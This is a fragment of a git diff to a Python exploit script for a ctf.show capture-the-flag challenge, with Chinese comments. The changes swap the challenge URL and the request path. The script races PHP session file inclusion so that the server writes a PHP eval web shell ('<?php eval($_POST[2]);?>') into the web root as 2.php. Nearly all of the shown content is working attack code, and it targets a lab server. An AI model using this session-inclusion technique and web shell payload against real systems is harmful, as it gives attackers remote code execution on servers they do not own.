@@ -11,7 +11,7 @@ import requests
 import io
 import threading
 
-url = "http://663c1f78-f8c8-44fe-b945-5343a313b0ba.challenge.ctf.show/"
+url = "http://5a20340f-a000-4102-8d28-fd23fa927486.challenge.ctf.show/"
 sessid = "TonyDog"  # 文件名可控，文件路径知道，就可以构造Session包含
 
 
@@ -35,7 +35,7 @@ def write(session):     # 往临时文件夹中写入文件
 def read(session):      # 读取临时文件夹中的临时文件
     while True:
         time.sleep(0.1)
-        res = session.post(url + "?file=/tmp/sess_" + sessid,  # 文件包含
+        res = session.post(url + "/tmp/sess_" + sessid,  # 文件包含
                            data={
                                "1": "file_put_contents('/var/www/html/2.php' , '<?php eval($_POST[2]);?>');"
                            },
